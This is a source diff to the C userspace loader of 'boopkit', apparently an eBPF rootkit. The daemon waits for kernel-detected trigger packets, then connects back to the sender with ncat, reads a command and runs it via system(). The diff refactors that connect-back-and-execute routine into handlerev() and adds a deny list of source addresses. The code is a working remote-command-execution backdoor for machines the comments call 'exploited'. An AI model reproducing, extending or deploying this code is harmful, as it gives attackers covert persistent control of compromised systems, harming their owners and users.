@@ -42,6 +42,9 @@
 // MAX_DENY_ADDRS is the maximum amount of address that can be denied.
 #define MAX_DENY_ADDRS 1024
 
+// MAX_RCE_SIZE is the maximum size of a remote command to execute.
+#define MAX_RCE_SIZE 1024
+
 // PROBE_BOOP is the eBPF probe to listen for boops
 #define PROBE_BOOP "pr0be.boop.o"
 #define PROBE_SAFE "pr0be.safe.o"
@@ -57,17 +60,43 @@ void asciiheader() {
   printf("\n\n");
 }
 
+// handlerev will handle a reverse lookup against
+// a triggered event. This is responsible for
+// finding whatever remote command will need to
+// be executed on the bookit exploited machine.
+char *handlerev(char dial[INET_ADDRSTRLEN]) {
+  char *recrce = malloc(MAX_RCE_SIZE);
+
+  // -- Hacky implementation --
+  char cmd[MAX_RCE_SIZE];
+  sprintf(cmd, "ncat %s %d", dial, PORT);
+  FILE *fp;
+  fp = popen(cmd, "r");
+  if (fp == NULL) {
+    return recrce;
+  }
+  while (fgets(recrce, MAX_RCE_SIZE, fp) != NULL) {
+    printf("RCE: %s\n", recrce);
+    return recrce;
+  }
+  // -- Hacky implementation --
+  return recrce;
+}
+
 struct config {
+  int denyc;
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
 } cfg;
 
 void clisetup(int argc, char **argv) {
+  cfg.denyc = 0;
   for (int i = 0; i < argc; i++) {
     if (argv[i][0] == '-') {
       switch (argv[i][1]) {
         case 'x':
           // Append deny addr
-          strcpy(cfg.deny[i], argv[i + 1]);
+          strcpy(cfg.deny[cfg.denyc], argv[i + 1]);
+          cfg.denyc++;
           break;
       }
     }
@@ -81,7 +110,7 @@ int main(int argc, char **argv) {
   asciiheader();
   clisetup(argc, argv);
 
-  printf("-----------------------------------------------\n");
+  printf("Logs: cat /sys/kernel/tracing/trace_pipe\n");
   // Return value for eBPF loading
   int loaded;
 
@@ -147,46 +176,47 @@ int main(int argc, char **argv) {
   int fd = bpf_map__fd(bpmap);
   printf("  -> eBPF Program Linked!\n");
 
-  printf("-----------------------------------------------\n");
-  printf("Logs: cat /sys/kernel/tracing/trace_pipe\n");
+  for (int i = 0; i < cfg.denyc; i++) {
+    printf("   X Deny address: %s\n", cfg.deny[i]);
+  }
 
   // ===========================================================================
   // Boopkit event loop
   //
   // Boopkit will run as a persistent daemon in userspace!
+  int ignore = 0;
   while (1) {
     // =========================================================================
     // Boop map management
     //
-    int ikey = 0, jkey, err;
+    int ikey = 0, jkey;
+    int err;
     char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
     struct tcp_return ret;
     while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {
-      err = bpf_map_lookup_elem(fd, &ikey, &jkey);
+      err = bpf_map_lookup_elem(fd, &jkey, &ret);
       if (err < 0) {
+        printf("-");
         continue;
       }
-      // TODO: Add denylist of saddrvals
+      printf(".");
+      ignore = 0;
       inet_ntop(AF_INET, &ret.saddr, saddrval, sizeof(saddrval));
-      printf("Reverse lookup for RCE. Connecting out: %s\n", saddrval);
-
-      // ---
-      char cmd[1024];
-      char rce[1024];
-      // TODO: Remove ncat and execute a socket directly in C
-      sprintf(cmd, "ncat %s %d", saddrval, PORT);
-      FILE *fp;
-      fp = popen(cmd, "r");
-      if (fp == NULL) {
-        continue;
+      for (int i = 0; i < cfg.denyc; i++) {
+        if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0){
+          // Ignoring string in deny list
+          ignore = 1;
+          break;
+        }
       }
-      while (fgets(rce, sizeof rce, fp) != NULL) {
-        // RCE here
-        printf("RCE: %s\n", rce);
-        system(rce);
+      if (!ignore) {
+          printf("Reverse lookup for RCE. Connecting out: %s\n", saddrval);
+          char *rce;
+          rce = handlerev(saddrval);
+          printf("Remote command received: %s\n", rce);
+          system(rce);
+          err = bpf_map_delete_elem(fd, &jkey);
       }
-      // ---
-      err = bpf_map_delete_elem(fd, &jkey);
       if (err < 0) {
         return 0;
       }
@@ -194,3 +224,4 @@ int main(int argc, char **argv) {
     }
   }
 }
+
